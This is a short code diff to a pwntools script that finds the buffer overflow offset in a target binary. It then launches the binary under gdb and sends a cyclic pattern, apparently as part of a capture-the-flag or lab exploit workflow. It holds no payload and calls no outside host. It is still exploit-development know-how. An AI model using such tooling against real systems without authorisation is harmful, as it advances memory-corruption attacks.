@@ -2,6 +2,7 @@
 from pwn import *
 import sys
 
+context(terminal=["tmux","splitw", "-h"])
 context.delete_corefiles = True
 context.log_level = 'error'
 
@@ -31,9 +32,15 @@ def locate_offset(binary):
         except:
             pass
 
+        p.close()
         buff_sz += 1
 
-    l.success("done")
+    l.success("offset at %s bytes" % offset)
+    p = gdb.debug(binary.path,'c')
+    p.recvuntil(": ")
+    payload = cyclic(offset + 8)
+    p.sendline(payload)
+    raw_input()
     return offset
 
 
